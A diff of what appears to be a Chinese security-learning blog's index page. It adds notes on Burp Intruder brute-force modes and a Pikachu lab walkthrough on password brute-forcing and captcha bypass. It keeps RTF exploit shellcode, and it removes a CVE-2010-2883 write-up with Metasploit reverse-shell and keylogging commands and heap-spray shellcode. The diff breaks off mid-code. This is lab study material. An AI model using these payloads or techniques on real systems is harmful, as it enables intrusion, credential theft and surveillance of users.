@@ -202,7 +202,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/IOT/" style="font-size: 16.67px;">IOT</a> <a href="/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" style="font-size: 10px;">IOT 《物联网渗透测试》</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 16.67px;">chrome_bug</a> <a href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 13.33px;">chrome调试</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/tags/%E3%80%8A0-Day%E5%AE%89%E5%85%A8%E3%80%8B/" style="font-size: 10px;">《0 Day安全》</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 13.33px;">漏洞战争</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
+                        <a href="/tags/IOT/" style="font-size: 16.67px;">IOT</a> <a href="/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" style="font-size: 10px;">IOT 《物联网渗透测试》</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/bp/" style="font-size: 10px;">bp</a> <a href="/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 16.67px;">chrome_bug</a> <a href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 13.33px;">chrome调试</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/tags/%E3%80%8A0-Day%E5%AE%89%E5%85%A8%E3%80%8B/" style="font-size: 10px;">《0 Day安全》</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 10px;">漏洞战争</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
                     </div>
                 </section>
                 
@@ -294,6 +294,183 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-bp四种密码爆破模式学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/11/02/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/" class="article-date">
+      <time datetime="2020-11-02T09:15:24.265Z" itemprop="datePublished">2020-11-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/02/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/">burp四种密码爆破模式学习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <ul>
+<li>Sniper:单参数爆破，多参数时同一个字典按顺序替换各参数，初始值有一个参数不变</li>
+<li>Battering ram:多参数同时爆破，但用的是同一个字典</li>
+<li>Pitchfork:多参数同时爆破，但用的是不同的字典</li>
+<li>Cluster bamb:多参数做笛卡尔乘积模式爆破</li>
+</ul>
+<h1 id="Sniper-狙击手"><a href="#Sniper-狙击手" class="headerlink" title="Sniper(狙击手)"></a>Sniper(狙击手)</h1><p>（一对一）</p>
+<p>一个参数a，若payload有x个，则执行x次。</p>
+<p>两个参数a、b,先执行爆破a的x次，再执行b的y次，共x+y次爆破。</p>
+<ul>
+<li>此模式主要适用于：竞争条件测试(选择NULL payloads)，密码、验证码暴力破解，重放攻击等场景<h1 id="Battering-ram-破城槌"><a href="#Battering-ram-破城槌" class="headerlink" title="Battering ram(破城槌)"></a>Battering ram(破城槌)</h1>（payload一对多）</li>
+</ul>
+<p>一个参数a，若payload有x个，则执行x次。</p>
+<p>两个参数a、b,payload被同事放到a、b变量中。适合需要在请求中把相同的输入放到多个位置的情况。</p>
+<ul>
+<li>此模式主要适用于：撞库</li>
+</ul>
+<h1 id="Pitchfork-音叉"><a href="#Pitchfork-音叉" class="headerlink" title="Pitchfork(音叉)"></a>Pitchfork(音叉)</h1><p>可以多组密码本payload</p>
+<p>a:1,2</p>
+<p>b:3,4</p>
+<p>第一次爆破为 1，3</p>
+<p>第二次爆破为 2，4</p>
+<ul>
+<li>此模式主要适用于：恶意注册<h1 id="Cluster-bomb-集束炸弹"><a href="#Cluster-bomb-集束炸弹" class="headerlink" title="Cluster bomb(集束炸弹)"></a>Cluster bomb(集束炸弹)</h1>（多对多）</li>
+</ul>
+<p>对payload组进行笛卡尔积，交叉组合，即a的一个payload值与b的每一个值进行组合爆破。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bp/" rel="tag">bp</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-pikachu漏洞练习1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/30/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/" class="article-date">
+      <time datetime="2020-10-30T08:02:38.085Z" itemprop="datePublished">2020-10-30</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/30/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/">pikachu漏洞练习记录1</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="0x01-暴力破解"><a href="#0x01-暴力破解" class="headerlink" title="0x01 暴力破解"></a>0x01 暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>开启bp抓包，对username,password字段的字典做爆破，得到admin/123456.</p>
+<h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><p>随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。</p>
+<p>将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。</p>
+<h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><p>同上步骤bp抓包，对用户密码进行爆破即可。后来查了一下这俩的区别。</p>
+<p>查看源码，输入的验证码在本地验证：</p>
+<p><img src="https://i.loli.net/2020/11/02/L4V56WHMm1JPDhc.png" alt="捕获.PNG"></p>
+<p>可以在bp上不输入验证码或输入错误验证码都可以爆破。</p>
+<h2 id="token放爆破？"><a href="#token放爆破？" class="headerlink" title="token放爆破？"></a>token放爆破？</h2><blockquote>
+<p>token:token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个token便将此token返回给客户端，以后客户端只需要带着这个token前来请求数据即可。</p>
+</blockquote>
+<h3 id="基于token的身份验证"><a href="#基于token的身份验证" class="headerlink" title="基于token的身份验证"></a>基于token的身份验证</h3><ul>
+<li>客户端使用用户名和密码请求登录</li>
+<li>服务端收到请求去验证用户名和密码</li>
+<li>验证成功后，服务端会签发一个token，再将token发送给客户端</li>
+<li>客户端收到token后可以将它存储起来，比如放在cookie中或Local Storage里。</li>
+<li>客户端每次向服务端请求资源的时候需要带着服务端签发的token</li>
+<li>服务端收到请求，验证客户端请求里带着的token，如果验证成功，就像客户端返回请求的数据。</li>
+<li>app登录的时候发送加密的用户名和密码到服务器，服务器验证用户名和密码，如果成功，以某种方式比如随机生成32位的字符串作为token，存储到服务器中，并返回token到app</li>
+</ul>
+<p>提交用户密码时页面会提交一个hidden属性的token值，每次提交都会更新，但每次产生的token以明文形式传到前端，我们可以在破解之前获取token值，填到字典中即可进行暴力破解。</p>
+<p><img src="https://i.loli.net/2020/11/02/dlBS7qgfN9cYiIP.png" alt="捕获.PNG"></p>
+<p>在测试器中，设置password和token两个变量，使用pitchfork。</p>
+<p>点击<b>选项</b>，更改请求引擎中线程数为1，重定向选择<b>总是</b></p>
+<p><b>Grep-Extract</b>选择<b>添加</b>，中间<b>获得回应包</b><br>，选择token的值复制并选定，点击OK.</p>
+<p><img src="https://i.loli.net/2020/11/02/uLlDMSy46Qp8x2e.png" alt="捕获.PNG"></p>
+<p>回到payload,set为1时设置简单清单，使用字典或自己随便输入密码。set为2时设置递归搜索，并如图黏贴token值。</p>
+<p><img src="https://i.loli.net/2020/11/02/gHncFXtKMUB9udA.png" alt="捕获.PNG"></p>
+<p>开始攻击，根据不同length找出正确密码，爆破完成。</p>
+<p>注：该方法着实鸡肋。</p>
+<h1 id="0x02-XSS-跨站脚本"><a href="#0x02-XSS-跨站脚本" class="headerlink" title="0x02 XSS(跨站脚本)"></a>0x02 XSS(跨站脚本)</h1><p>XSS是一种发生在前端浏览器端的漏洞，危害对象也是前端用户，形成XSS漏洞的主要原因是程序对输入输出没有做合适的处理，导致精心构造的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p>
+<p>因此在XSS漏洞的防范上一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。</p>
+<ul>
+<li>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入。</li>
+<li>输出转义：根据输出点的位置对输出到前端的额呢绒进行适当转义。</li>
+</ul>
+<h2 id="反射性xss-get"><a href="#反射性xss-get" class="headerlink" title="反射性xss(get)"></a>反射性xss(get)</h2>
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-类型漏洞合集" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -490,166 +667,6 @@
 <h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃</p>
 <h3 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h3><p>分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，<br>布置shellcode如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\rtf1&#123;&#125;&#123;\shp&#123;\*\shpinst&#123;\sp&#123;\sn pfragments&#125;&#123;\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" rel="tag">漏洞战争</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-漏洞战争学习笔记1：CVE-2010-2883" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/10/16/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9ACVE-2010-2883/" class="article-date">
-      <time datetime="2020-10-16T04:29:57.535Z" itemprop="datePublished">2020-10-16</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/16/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9ACVE-2010-2883/">漏洞战争学习笔记1：CVE-2010-2883</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="漏洞背景介绍"><a href="#漏洞背景介绍" class="headerlink" title="漏洞背景介绍"></a>漏洞背景介绍</h2><p>CVE-2010-2883是Adobe Reader 和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的pdf文件就有可能导致执行任意代码。</p>
-<h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><p>操作系统：Windows XP SP3<br>调试器：OllyDbg<br>反汇编：IDA pro 7.2<br>目标：Adobe Reader 9.3.0</p>
-<h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><ul>
-<li>攻击机：kali</li>
-<li>靶机：windows xp sp3</li>
-</ul>
-<p>kali机上，打开msfconsole,使用metasploit生成pdf木马文件</p>
-<ul>
-<li>msfconsole -q //进入msf框架</li>
-<li>search cve-2010-2883 //找到漏洞模块</li>
-<li>use exploit/windows/fileformat/adobe_cooltype_sing //使用模块</li>
-<li>set payload windows/meterpreter/reverse_tcp //调用meterpreter载荷，反向连接到渗透机</li>
-<li>set lhost 192.168.119.128 //设置主机ip</li>
-<li>set FileNAME 2883.pdf //设置生产带有后门pdf文件名</li>
-<li>set lport 99999 //设置本地监听端口</li>
-<li>exploit //执行渗透生成文件成功</li>
-</ul>
-<p>将文件拷贝到windows xp（靶机）。</p>
-<p>metasploit开启shell监听会话</p>
-<p><img src="https://i.loli.net/2020/07/20/WvKMtdn3P8bx5cB.png" alt="获取到shell.PNG"></p>
-<ul>
-<li>back</li>
-<li>use exploit/multi/handler //使用hhandler监听模块</li>
-<li>set payload windows/meterpreter/reverse_tcp</li>
-<li>set lhost 192.168.119.128 //设置及监听IP地址（kali）</li>
-<li>set lport 9999 //设置监听的端口（与pdg文件一致）</li>
-<li>exploit //开启监听</li>
-</ul>
-<p>靶机打开2883.pdf文件，kali端即可获取shell会话。</p>
-<ul>
-<li>sysinfo //查看系统信息</li>
-<li>getuid //查看当前用户</li>
-<li>screenshot //截屏查看靶机桌面</li>
-<li>ps //查看进程</li>
-<li>migrate 148 //切换进程到148 </li>
-<li>shell //获取到Dos shell</li>
-<li>keyscan_start //开启键盘记录</li>
-<li>keyscan_dump //输出键盘记录</li>
-</ul>
-<h2 id="0x02-基于字符串定位的漏洞分析方法"><a href="#0x02-基于字符串定位的漏洞分析方法" class="headerlink" title="0x02 基于字符串定位的漏洞分析方法"></a>0x02 基于字符串定位的漏洞分析方法</h2><h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p>打开cooltype.dll，alt+t搜索“SING”，依次进入检查是否有敏感信息，大概是第二个SING,发现调用函数sttrcat，在拼接字符串时未进行长度检查，可能会造成栈溢出，strcat为溢出点。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DBF2                 push    ebp</span><br><span class="line">.text:0803DBF3                 sub     esp, 104h       ; 分配栈空间0x104h</span><br><span class="line">.text:0803DBF9                 lea     ebp, [esp-4]    ; 后面的strcat会将执行结果保存在ebp中，strcat的目的地</span><br><span class="line">.text:0803DBFD                 mov     eax, ___security_cookie ；安全cookie</span><br><span class="line">.text:0803DC02                 xor     eax, ebp ;cookie^ebp(sep-4);</span><br><span class="line">.text:0803DC04                 mov     [ebp+108h+var_4], eax ;将cookie保存到栈，以作安全检查</span><br><span class="line">.text:0803DC0A                 push    4Ch</span><br><span class="line">.text:0803DC0C                 mov     eax, offset loc_81847C4</span><br><span class="line">.text:0803DC11                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DC16                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DC1C                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DC22                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DC28                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DC2B                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DC2E                 call    sub_8041626</span><br><span class="line">.text:0803DC33                 xor     esi, esi</span><br><span class="line">.text:0803DC35                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DC39 ;   try &#123;</span><br><span class="line">.text:0803DC39                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DC3C                 jz      loc_803DDF9</span><br><span class="line">.text:0803DC42                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DC45                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DC48                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DC48 ;   &#125; &#x2F;&#x2F; starts at 803DC39</span><br><span class="line">.text:0803DC4C ;   try &#123;</span><br><span class="line">.text:0803DC4C                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DC50                 jnz     loc_803DDA2</span><br><span class="line">.text:0803DC56                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DC5B                 push    edi             ; int</span><br><span class="line">.text:0803DC5C                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DC5F                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DC63                 call    sub_802178F</span><br><span class="line">.text:0803DC68                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DC6B                 jnz     short loc_803DCD6</span><br><span class="line">.text:0803DC6D                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DC72                 push    edi             ; int</span><br><span class="line">.text:0803DC73                 lea     ecx, [ebp+108h+var_12C] ; ecx传参，thiscall调用约定，推测指向sing表入口</span><br><span class="line">.text:0803DC76                 call    sub_8021ABE     ; 处理sing表</span><br><span class="line">.text:0803DC7B                 mov     eax, [ebp+108h+var_12C] ；SING表地址给eax</span><br><span class="line">.text:0803DC7E                 cmp     eax, esi        ; 判断是否为空</span><br><span class="line">.text:0803DC7E ;   &#125; &#x2F;&#x2F; starts at 803DC4C</span><br><span class="line">.text:0803DC80 ;   try &#123;</span><br><span class="line">.text:0803DC80                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DC84                 jz      short loc_803DCBD ; 不跳转</span><br><span class="line">.text:0803DC86                 mov     ecx, [eax]      ; 字体资源版本号，这里为1.0版本，即00 10 00 00</span><br><span class="line">.text:0803DC88                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DC8E                 jz      short loc_803DC98 ; 跳转</span><br><span class="line">.text:0803DC90                 cmp     ecx, 100h</span><br><span class="line">.text:0803DC96                 jnz     short loc_803DCB9</span><br><span class="line">.text:0803DC98</span><br><span class="line">.text:0803DC98 loc_803DC98:                            ; CODE XREF: sub_803DBF2+9C↑j</span><br><span class="line">.text:0803DC98                 add     eax, 10h        ; 相对sing表入口偏移0x10处找到uniqueName</span><br><span class="line">.text:0803DC9B                 push    eax             ; Source 源地址，长度不固定</span><br><span class="line">.text:0803DC9C                 lea     eax, [ebp+108h+Dest] ；eax&#x3D;ebp+108-108&#x3D;ebp;ebp&#x3D;esp-4,即复制到栈顶部位置</span><br><span class="line">.text:0803DC9F                 push    eax             ; Dest 目的地址：固定大小的栈空间</span><br><span class="line">.text:0803DCA0                 mov     [ebp+108h+Dest], 0 ；清0</span><br><span class="line">.text:0803DCA4                 call    strcat          ; 未检查大小，造成溢出</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>GS:由IDA汇编分析，函数开始出有安全cookie，判定存在GS机制。<br>DEP:数据执行保护，即没有执行权限的内存空间不允许执行代码。<br>ASLR:地址空间布局随机化，包含映像随机化与堆栈随机化，010Editor打开目标exe，找到相关字段，发现已开启。</p>
-</blockquote>
-<p><img src="https://i.loli.net/2020/07/24/aLpHZ9y4qbc7dAu.png" alt="图片.png"></p>
-<h3 id="SING表结构分析"><a href="#SING表结构分析" class="headerlink" title="SING表结构分析"></a>SING表结构分析</h3><p>在kali生成的msf.pdf文件，使用PdfStreamDumper打开，在第十个Stream中找到Sing字段，将整合各Stream另存为TTF文件。</p>
-<p><img src="https://i.loli.net/2020/07/24/fEzYQ4GMuwoDvP3.png" alt="工具找到sing字段.PNG"></p>
-<p><img src="https://i.loli.net/2020/07/24/41Jd3hzA8G6fyYw.png" alt="捕获.PNG"><br>官方文档中对TableEntry结构的定义：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef sturct_SING</span><br><span class="line">&#123;</span><br><span class="line">char tag[4]; &#x2F;&#x2F;标记：“SING”</span><br><span class="line">ULNG checkSum; &#x2F;&#x2F;校验和：“0xD9BCC8B5”</span><br><span class="line">ULNG offset; &#x2F;&#x2F;相对文件的偏移：“0x0000011C”</span><br><span class="line">ULONG length; &#x2F;&#x2F;数据长度：“0x00001DDF”</span><br><span class="line">&#125;TableEntry;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2020/07/24/J8laM9DIOiYHeg7.png" alt="TTF的tableentry结构.PNG"></p>
-<h3 id="JS堆喷射代码"><a href="#JS堆喷射代码" class="headerlink" title="JS堆喷射代码"></a>JS堆喷射代码</h3><p>在第一个object处找到OpenAction,表示在第11个obj中，pdf运行时会执行里面脚本。</p>
-<p><img src="https://i.loli.net/2020/07/24/a3IvshLZowWm1xn.png" alt="捕获.PNG"></p>
-<p>进入第11个obj，表示执行的js代码位于第12个obj中。</p>
-<p><img src="https://i.loli.net/2020/07/24/yxZ5nCGAFtvorkJ.png" alt="捕获.PNG"></p>
-<p>进入第12个obj，发现实现堆喷射的js脚本。代码是经过混淆的，简单整理后获得js代码。（此处使用大佬整理好的了）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var shellcode &#x3D; unescape( &#39;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ud7da%u82ba%ube98%ud9de%u2474%u5ef4%uc931%u31b1%uee83%u31fc%u1456%u5603%u7a96%u224b%uf87e%udbb4%u9d7e%u3e3d%u9d4f%u4a5a%u2dff%u1e28%uc6f3%u8b7c%uab80%ubca8%u0121%uf38f%u3ab2%u92f3%u4130%u7520%u8a09%u7435%uf74e%u24b4%u7307%ud96a%uc92c%u52b7%udf7e%u87bf%ude36%u19ee%ub94d%u9b30%ub182%u8378%ufcc7%u3833%u8a33%ue8c5%u730a%ud569%u86a3%u1173%u7903%u6b06%u0470%ua811%ud20b%u2b94%u91ab%u900f%u754a%u53c9%u3240%u3c9d%uc544%u3772%u4e70%u9875%u14f1%u3c52%uce5a%u65fb%ua106%u7504%u1ee9%ufda1%u4a07%u5fd8%u8d4d%uda6e%u8d23%ue570%ue613%u6e41%u71fc%ua55e%u8eb9%ue414%u06eb%u7cf1%u4aae%uab02%u72ec%u5e81%u808c%u2a99%ucd89%uc61d%u5ee3%ue8c8%u5e50%u8ad9%ucc37%u6281%u74d2%u7b23&#39; );</span><br><span class="line">var nop &#x3D; unescape( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );</span><br><span class="line">while (nop.length + 20 + 8 &lt; 65536)</span><br><span class="line"> 